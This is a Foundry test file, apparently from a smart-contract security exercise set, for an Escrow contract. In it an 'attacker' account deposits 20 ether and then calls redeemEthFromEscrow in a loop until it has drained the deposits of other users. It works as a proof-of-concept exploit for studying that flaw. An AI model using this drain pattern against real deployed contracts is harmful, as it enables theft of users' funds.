// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import {console, Test} from "forge-std/Test.sol";

import {Escrow} from "../src/unchecked-return-2/Escrow.sol";
import {EscrowNFT} from "../src/unchecked-return-2/EscrowNFT.sol";

contract TestEscrow is Test {
    Escrow escrow;
    EscrowNFT escrownft;

    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address attacker = makeAddr("attacker");

    function setUp() external {
        vm.prank(deployer);
        escrownft = new EscrowNFT();
        escrow = new Escrow(address(escrownft));

        vm.prank(deployer);
        escrownft.transferOwnership(address(escrow));

        vm.deal(user1, 50 ether);
        vm.deal(user2, 50 ether);
        vm.deal(attacker, 50 ether);
    }

    function test_escrow() external {
        vm.warp(1641070800);
        vm.startPrank(user1);
        escrow.escrowEth{value: 10 ether}(user1, 0);
        console.log(escrownft.tokenCounter());
        vm.stopPrank();

        vm.warp(1641070800);
        vm.startPrank(user2);
        escrow.escrowEth{value: 10 ether}(user2, 0);
        console.log(escrownft.tokenCounter());
        vm.stopPrank();

        vm.warp(1641070800);
        vm.startPrank(attacker);
        escrow.escrowEth{value: 20 ether}(attacker, 0);
        console.log(escrownft.tokenCounter());
        vm.stopPrank();

        assertEq(address(escrow).balance, 40 ether);

        // redeem ether
        vm.warp(1641070800);
        vm.startPrank(attacker);
        while (address(escrow).balance != 0) {
            escrow.redeemEthFromEscrow(3);
        }
        assertEq(address(attacker).balance, 70 ether);
        assertEq(address(escrow).balance, 0 ether);
        vm.stopPrank();
    }
}
